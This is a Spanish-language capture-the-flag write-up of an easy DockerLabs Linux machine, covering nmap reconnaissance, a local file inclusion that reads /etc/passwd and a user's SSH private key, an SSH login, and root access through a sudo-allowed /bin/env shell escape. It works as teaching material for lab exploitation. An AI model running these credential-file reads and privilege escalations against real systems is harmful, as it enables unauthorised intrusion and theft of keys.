Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #lfi #dockerlabs

![](assets/Pasted%20image%2020251105000419.png)

## Reconocimiento

Empiezo tirando un escaneo de nmap para ver los puertos que están abiertos

```bash
nmap -p- --open -sS -T5 --min-rate 5000 -Pn -n -oN ports.txt 172.17.0.2
----------------------------------------------------------------------
Nmap scan report for 172.17.0.2
Host is up (0.0000090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 5E:17:D0:42:D8:82 (Unknown)
```

- Puerto 80 y 22 abiertos

Sobre los puertos abiertos realizo un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
nmap -p 22,80 -sCV -sS -T5 --min-rate 5000 -Pn -n -oN target.txt 172.17.0.2
----------------------------------------------------------------------------
Nmap scan report for 172.17.0.2
Host is up (0.000043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 2e:4a:72:a0:b2:40:3a:36:99:c9:2d:a7:62:61:16:e7 (ECDSA)
|_  256 7c:7d:78:7a:20:2b:d0:75:92:26:1b:41:3c:ca:79:3c (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: Advertencia: LeFvIrus
MAC Address: 5E:17:D0:42:D8:82 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- Puerto 22 SSH: OpenSSH 9.2p1 Debian 2+deb12u3
- Puerto 80 HTTP:  Apache httpd 2.4.61

## Enumeración

### **Puerto 80**

Al parecer es una pagina donde me clavaron un virus.......

![](assets/Pasted%20image%2020251105001227.png)

Al darle al boton de ejemplos de computadoras infectadas nos lleva a esta otra vista

```
> http://172.17.0.2/ejemplos.php?images=./ejemplo1.png
```

![](assets/Pasted%20image%2020251105002745.png)

- Podemos notar en la URL que el parametro `images` cuyo valor es la ruta del archivo `ejemplo1.png` es quien esta tratando de listar el archivo.

## Explotación LFI

!!! info

    LFI (Local File Inclusion) es una vulnerabilidad web que permite a un atacante leer o incluir archivos locales del servidor manipulando parámetros que no están correctamente validados, como rutas de archivos.
    Puede exponer información sensible del sistema y, en ciertos casos, derivar en ejecución de código.

Al identificar que la aplicación web intentaba listar un archivo mediante un parametro, probé manipular la ruta para apuntar a /etc/passwd y verificar si el contenido era mostrado correctamente por la aplicación.

```
> http://172.17.0.2/ejemplos.php?images=/etc/passwd
```

La web si me lista el contenido y obtengo lo siguiente del `/etc/passwd`:

- Podemos dar Ctrl + U en la web para ver el codigo fuente y ver de mejor manera la respuesta. 

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
nico:x:1000:1000:,,,:/home/nico:/bin/bash ---------------------------------------------------
```

- Podemos notar que existe un usuario llamado nico.

```
nico:x:1000:1000:,,,:/home/nico:/bin/bash_
```

Sabiendo que el servicio `SSH` esta abierto, es posible que el usuario nico tenga alguna clave privada. Por lo cual aprovechándome del LFI puedo tratar de apuntar a dicha clave.

```
> http://172.17.0.2/ejemplos.php?images=/home/nico/.ssh/id_rsa
```

La web efectivamente lista la clave ssh del usuario nico.

```
       -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA07BRWc6X8Yz+VwO1l5UAqcFE5K+1yQ9QxFBrt8DzyC9x7o0tluCk
4f4gObHgatf/tXX/z8oGKYnAY48/vctJz//3M9phYgcFhoDOs+F3NgyYZ7oZN/TeEgTlql
<MAS...>
```

Procedí a guardar la clave en mi sistema y a darle permisos.

```bash
> chmod 600 id_rsa
```

Me conecto mediante SSH

```bash
> ssh -i id_rsa nico@172.17.0.2
----------------------------------------------------------------------------------------------------
Linux 151ebf5d80e7 6.12.32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.32-1parrot1 (2025-06-27) x86_64
Last login: Wed Aug 21 21:11:09 2024 from 172.17.0.1
nico@151ebf5d80e7:~$ whoami
nico
```


## Escalada de Privilegios

Lo primero que hago es enumerar binarios que pueda ejecutar como `root`. 

```bash
> sudo -l
---------------------------------------------------------------------------------------------------------------------                                                                                                                                                 
Matching Defaults entries for nico on 151ebf5d80e7:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User nico may run the following commands on 151ebf5d80e7:
    (ALL) NOPASSWD: /bin/env
```

- Encontramos que el binario _env_ puede ser ejecutado como cualquier usuario sin necesidad de contraseña

Con ayuda de [GTFObins](https://gtfobins.github.io/gtfobins/env/) abuso del binario y escalo al usuario `root`.

```bash
> nico@151ebf5d80e7:~$ sudo -u root env /bin/sh                                                                                                                                
> whoami
root
```


***PWNED***